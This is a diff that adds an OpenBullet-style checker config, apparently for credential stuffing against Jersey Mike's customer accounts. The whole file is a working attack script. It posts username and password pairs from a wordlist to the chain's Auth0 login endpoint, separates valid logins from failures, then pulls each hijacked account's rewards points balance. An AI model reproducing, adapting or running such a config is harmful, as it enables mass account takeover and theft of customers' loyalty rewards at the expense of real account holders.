@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Jersey Mikes",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-09T04:17:31.0464598+01:00",
+  "AdditionalInfo": "",
+  "Author": "Lukieboiz",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://login.jerseymikes.com/oauth/token" 
+  CONTENT "{\"grant_type\":\"http:\\/\\/auth0.com\\/oauth\\/grant-type\\/password-realm\",\"password\":\"<PASS>\",\"realm\":\"Username-Password-Authentication\",\"scope\":\"openid profile email address phone offline_access\",\"audience\":\"https:\\/\\/prd.bedrock.jerseymikes.com\\/api\",\"username\":\"<USER>\",\"client_id\":\"OegTBlnQDoCX2O1tHTQKUNQZhFwvBzPL\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Auth0-Client: eyJuYW1lIjoiQXV0aDAuc3dpZnQiLCJlbnYiOnsic3dpZnQiOiI0LngiLCJpT1MiOiIxMi4yIn0sInZlcnNpb24iOiIxLjE1LjAifQ" 
+
+#Parse_Token PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "token" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong email or password" 
+
+#Customer REQUEST GET "https://prd.bedrock.jerseymikes.com/api/v0/customers" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <token>" 
+
+#Capture_Points PARSE "<SOURCE>" LR "pointsBalance\":" ",\"" -> CAP "Points" 
+
